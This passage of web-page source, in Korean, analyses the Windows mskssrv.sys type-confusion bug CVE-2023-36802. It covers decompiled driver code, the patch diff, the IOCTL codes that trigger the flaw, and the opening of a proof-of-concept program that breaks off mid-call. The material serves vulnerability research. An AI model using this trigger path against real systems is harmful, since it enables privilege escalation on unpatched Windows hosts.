_jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \"_obj )\\n    \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"return\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0xC000009A\"\n        }), \";\\n  \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// FSStreamReg 초기화\"\n        }), \"\\n  \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" ( (unsigned int)\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Feature\"\n        }), \"_Servicing_TeamsUsingMediaFoundationCrashes__private_IsEnabled() )\\n    result = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Initialize\"\n        }), \"((\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \" *)\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamRegObj\"\n        }), \", irp, v11, data, irp->\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"RequestorMode\"\n        }), \");\\n  \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"else\"\n        }), \"\\n    result = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Initialize\"\n        }), \"((\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \" *)\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamRegObj\"\n        }), \", v10, data, irp->\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"RequestorMode\"\n        }), \");\\n\\n  ...\\n  \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// FSStreamReg_obj를 FsContext2에 저장\"\n        }), \"\\n  obj->\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FileObject\"\n        }), \"->\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \" = (\", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"PVOID\"\n        }), \")\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \"_obj;\\n  \", _jsx(_components.span, {\n          className: \"hljs-title function_\",\n          children: \"_InterlockedIncrement\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \"_obj + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"6\"\n        }), \");\\n  ...\\n\"]\n      })\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"CVE-2023–36802\"\n    }), \"\\n\", _jsxs(_components.p, {\n      children: [\"위에서 언급한 대로, obj-\", _jsx(_components.code, {\n        children: \"FileObject-\"\n      }), \"FsContext2가 FSStreamReg 유형으로 간주되고 있었습니다. 그러나 이 가정이 맞는 것일까요?\"]\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"FSRendezvousServer::FindObject 함수를 살펴보겠습니다. 이 함수는 FsContext2가 FSRendezvousServer 객체 내에 있는지 확인합니다.\"\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-js\",\n        children: [\"char __fastcall \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FindObject\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \" *\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \", __int64 \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \")\\n{\\n  \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" ( \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \" )\\n  {\\n    \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" ( *(_DWORD *)(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \" + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x30\"\n        }), \") == \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"1\"\n        }), \" ) \\n    {\\n      \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// Type number가 `1`인 경우\"\n        }), \"\\n      ...\\n      \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"while\"\n        }), \" ( \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"1\"\n        }), \" ) \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// RegObjectList를 검색합니다.\"\n        }), \"\\n      {\\n        \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Type1RegObj\"\n        }), \" = *(_QWORD **)(\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \" + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x90\"\n        }), \");\\n        \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" ( !\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Type1RegObj\"\n        }), \" || (_QWORD *)*\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Type1ListHead\"\n        }), \" == \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Type1ListHead\"\n        }), \" || \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Type1RegObj\"\n        }), \" == \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Type1ListHead\"\n        }), \" )\\n          \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"break\"\n        }), \";\\n        \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" ( \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Type1RegObj\"\n        }), \" != (_QWORD *)\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"8\"\n        }), \" && \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Type1RegObj\"\n        }), \"[\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"3\"\n        }), \"] == \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \" ) \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// FsContext2를 찾았습니다!!!\"\n        }), \"\\n          \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"return\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"1\"\n        }), \";\\n        \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRegObjectList\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"MoveNext\"\n        }), \"((\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \" *)((char *)\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \" + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x70\"\n        }), \"));\\n      }\\n    }\\n    \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"else\"\n        }), \" \\n    {\\n      \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// Type number가 `1`이 아닌 경우\"\n        }), \"\\n      ...\\n      \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"while\"\n        }), \" ( \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"1\"\n        }), \" ) \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// RegObjectList를 검색합니다.\"\n        }), \"\\n      {\\n        \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Type2RegObj\"\n        }), \" = *(_QWORD **)(\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \" + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x60\"\n        }), \");\\n        \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" ( !\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Type2RegObj\"\n        }), \" || (_QWORD *)*\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Type2ListHead\"\n        }), \" == \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Type2ListHead\"\n        }), \" || \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Type2RegObj\"\n        }), \" == \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Type2ListHead\"\n        }), \" )\\n          \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"break\"\n        }), \";\\n        \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" ( \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Type2RegObj\"\n        }), \" != (_QWORD *)\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"8\"\n        }), \" && \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Type2RegObj\"\n        }), \"[\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"3\"\n        }), \"] == \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \" ) \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// FsContext2를 찾았습니다!!!\"\n        }), \"\\n          \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"return\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"1\"\n        }), \";\\n        \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRegObjectList\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"MoveNext\"\n        }), \"((\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \" *)((char *)\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \" + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x40\"\n        }), \"));\\n      }\\n    }\\n  }\\n  \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"return\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0\"\n        }), \";\\n}\\n\"]\n      })\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"FSRendezvousServer::FindObject는 FsContext2의 0x30 오프셋에 위치한 타입 번호에 따라 두 가지 종류의 객체가 있다는 것을 명시적으로 보여줍니다. FSStreamReg::FSStreamReg에서 FSStreamReg 타입의 생성자로부터, FSStreamReg의 타입 번호를 2로 알 수 있습니다.\"\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-js\",\n        children: [\"__int64 __fastcall \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \"(__int64 \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \")\\n{\\n  ...\\n  *(_QWORD *)\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \" = &\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`vftable';\\n  *(_QWORD *)(FSStreamReg + 0x20) = FSStreamReg;\\n  *(_DWORD *)(FSStreamReg + 0x30) = 2;        // 타입 == 2\\n  *(_DWORD *)(FSStreamReg + 0x34) = 0x1D8;    // 크기 == 0x1D8\\n  ...\\n  return FSStreamReg;\\n}\\n\"\n        })]\n      })\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"mskssrv.sys 드라이버를 분석한 후, type number가 1인 FSContextReg 객체를 찾을 수 있었습니다.\"\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-js\",\n        children: [\"__int64 __fastcall \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"InitializeContext\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \" *\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \", struct _IRP *a2)\\n{\\n  ...\\n  \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSContextReg\"\n        }), \" = (__int64)operator \", _jsx(_components.span, {\n          className: \"hljs-title function_\",\n          children: \"new\"\n        }), \"(0x78ui64, (enum _POOL_TYPE)a2, 0x67657243u);\\n  \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" ( \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSContextReg\"\n        }), \" )\\n  {\\n    ...\\n    *(_QWORD *)\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSContextReg\"\n        }), \" = &\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSContextReg\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`vftable'; // VTable 설정\\n    *(_QWORD *)(FSContextReg + 0x20) = FSContextReg;\\n    *(_DWORD *)(FSContextReg + 0x30) = 1;    // Type == 1\\n    *(_DWORD *)(FSContextReg + 0x34) = 0x78; // Size == 0x78\\n    ...\\n  }\\n  ...\\n  obj->FileObject->FsContext2 = (PVOID)FSContextReg;\\n  ...\\n}\\n\"\n        })]\n      })\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"FSContextReg의 크기로부터 (FSContextReg는 0x78바이트, FSStreamReg는 0x1D8바이트) FSContextReg가 FSStreamReg를 상속받지 않는다는 것을 알 수 있습니다. 자식 클래스는 부모 클래스의 모든 필드를 상속받기 때문에, 자식 클래스는 동일하거나 더 큰 크기를 가져야 합니다. 또한, FSRendezvousServer::FindObject 이후 추가 유효성 검사 루틴이 있으며, FSContextReg는 FSStreamReg::PublishTx의 첫 번째 인수로 사용될 수 있습니다. 따라서, 타입 혼란 취약점이 발생합니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"타입 혼란이 발생하면 FSStreamReg::PublishTx는 두 객체 간에 상속 관계가 없더라도 FSContextReg 객체를 FSStreamReg 타입으로 처리할 것입니다.\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-js\",\n        children: [\"__int64 __fastcall \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"PublishTx\"\n        }), \"(__int64 \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsStreamReg\"\n        }), \", __int64 data)\\n{\\n  \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"//\"\n        }), \"\\n  result = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"CheckRecycle\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsStreamReg\"\n        }), \", data);\\n  ...\\n  \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// 경계를 벗어난 접근\"\n        }), \"\\n  kEvent = *(struct _KEVENT **)(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsStreamReg\"\n        }), \" + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x130\"\n        }), \");\\n  \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" (kEvent)\\n  {\\n    \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"KeSetEvent\"\n        }), \"(kEvent, \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0\"\n        }), \", \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0\"\n        }), \");\\n    \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSFrameMdlobj\"\n        }), \" = 0i64;\\n\", _jsx(_components.span, {\n          className: \"hljs-attr\",\n          children: \"LABEL_21\"\n        }), \":\\n    \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" (\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSFrameMdlobj\"\n        }), \")\\n    {\\n      \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSFrameMdl\"\n        }), \"::~\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSFrameMdl\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSFrameMdlobj\"\n        }), \");\\n      operator \", _jsx(_components.span, {\n          className: \"hljs-title function_\",\n          children: \"delete\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSFrameMdlobj\"\n        }), \");\\n    }\\n  }\\n  ...\\n}\\n\\n__int64 __fastcall \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"CheckRecycle\"\n        }), \"(__int64 \", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \", __int64 data)\\n{\\n  \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" (data)\\n  {\\n    value1 = *(_DWORD *)(data + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x24\"\n        }), \");\\n    \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" (value1)\\n    {\\n      ...\\n      \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// 경계를 벗어난 접근\"\n        }), \"\\n      v12 = *(_QWORD *)(\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \" + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x1B0\"\n        }), \");\\n      v13 = v5 + *(_DWORD *)(\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \" + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x1BC\"\n        }), \");\\n      v14 = *(int *)(\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \" + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x1B8\"\n        }), \");\\n  ...\\n}\\n\"]\n      })\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"두 객체 간 사이즈 차이로 인해 형태 혼란이 발생하여 경계를 벗어난 접근 취약점이 발생합니다. 공격자는 이러한 기본적인 취약점을 활용하여 메모리 레이아웃을 조작하여 시스템 권한을 획들할 수 있습니다.\"\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"CVE-2023–36802의 패치\"\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-js\",\n        children: [\"-char __fastcall \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FindObject\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \" *\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \", __int64 \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \")\\n+char __fastcall \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FindStreamObject\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \" *\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \", __int64 \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \")\\n{\\n  \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" (\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \")\\n  {\\n-    \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" (*(_DWORD *)(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \" + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x30\"\n        }), \") == \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"1\"\n        }), \") \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// 유형 1 확인\"\n        }), \"\\n-    {\\n-      \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContextList\"\n        }), \" = (_QWORD *)((char *)\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \" + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x80\"\n        }), \");\\n-      \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"/* FsContext2를 찾기 위한 링크드 리스트 검색 */\"\n        }), \"\\n-    }\\n-    \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"else\"\n        }), \"\\n+    \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" (*(_DWORD *)(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \" + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x30\"\n        }), \") == \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"2\"\n        }), \") \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// 유형 2 확인\"\n        }), \"\\n    {\\n      \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsStreamList\"\n        }), \" = (_QWORD *)((char *)\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \" + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"80\"\n        }), \");\\n      \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"/* FsContext2를 찾기 위한 링크드 리스트 검색 */\"\n        }), \"\\n    }\\n  }\\n  \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"return\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0\"\n        }), \";\\n}\\n\"]\n      })\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"FSRendezvousServer::FindObject의 이름이 FSRendezvousServer::FindStreamObject로 변경되었습니다. 이 함수는 타입 번호 2의 FSStreamReg 오브젝트를 탐색합니다.\"\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"취약점 발생\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"이 취약점을 발생시키기 위해서는 FSContextReg 오브젝트를 만들어야 합니다. 이 오브젝트는 FSRendezvousServer::InitializeContext에서 생성할 수 있으며, 이 함수는 IoControlCode가 0x2F0400일 때 호출됩니다.\"\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-js\",\n        children: [\"__int64 __fastcall \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSInitializeContextRendezvous\"\n        }), \"(struct _IRP *a1)\\n{\\n  ...\\n  \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"RendezvousServerObj\"\n        }), \" = operator \", _jsx(_components.span, {\n          className: \"hljs-title function_\",\n          children: \"new\"\n        }), \"(0xA0ui64, v3, 0x73767A52u);\\n  \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"RendezvousServerObj\"\n        }), \"){\\n    \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// RendezvousServerObj 초기화\"\n        }), \"\\n  }\\n  \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ServerObj\"\n        }), \"_1C0005048 = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"RendezvousServerObj\"\n        }), \"_;\\n  ...\\n  \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// `FSRendezvousServer::InitializeContext`에서 FSContextReg 오브젝트 생성\"\n        }), \"\\n  result = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"InitializeContext\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"RendezvousServerObj\"\n        }), \", a1);\\n  \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Release\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"RendezvousServerObj\"\n        }), \");\\n  \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"return\"\n        }), \" result;\\n}\\n\"]\n      })\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"그러면 취약한 함수 중 하나를 트리거하여 FSRendezvousServer::PublishTx(0x2F0408), FSRendezvousServer::PublishRx(0x2F040C), FSRendezvousServer::ConsumeTx(0x2F0410), FSRendezvousServer::ConsumeRx(0x2F0414)를 실행합니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"아래 PoC는 FSStreamReg::PublishRx를 트리거하는 데 사용됩니다.\"\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-js\",\n        children: [\"#define inputsize \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x100\"\n        }), \"\\n#define outputsize \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x100\"\n        }), \"\\nint \", _jsx(_components.span, {\n          className: \"hljs-title function_\",\n          children: \"wmain\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-params\",\n          children: \"int argc, wchar_t** argv\"\n        }), \") {\\n  \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"WCHAR\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"DeviceLink\"\n        }), \"[\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"256\"\n        }), \"] = L\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"\\\"\\\\\\\\\\\\\\\\?\\\\\\\\ROOT#SYSTEM#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\\\\\\\{96E080C7-143C-11D1-B40F-00A0C9223196}&{3C0D501A-140B-11D1-B40F-00A0C9223196}\\\"\"\n        }), \";\\n  \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"HANDLE\"\n        }), \" hDevice = \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"NULL\"\n        }), \";\\n  \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"NTSTATUS\"\n        }), \" ntstatus = \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0\"\n        }), \";\\n  hDevice = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"CreateFile\"\n        }), \"(\\n    \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"DeviceLink\"\n        }), \",\\n    \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"GENERIC_READ\"\n        }), \" | \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"GENERIC_WRITE\"\n        }), \",\\n    \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0\"\n        }), \",\\n    \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"NULL\"\n        }), \",\\n    \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"OPEN_EXISTING\"\n        }), \",\\n    \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x80\"\n        }), \",\\n    \", 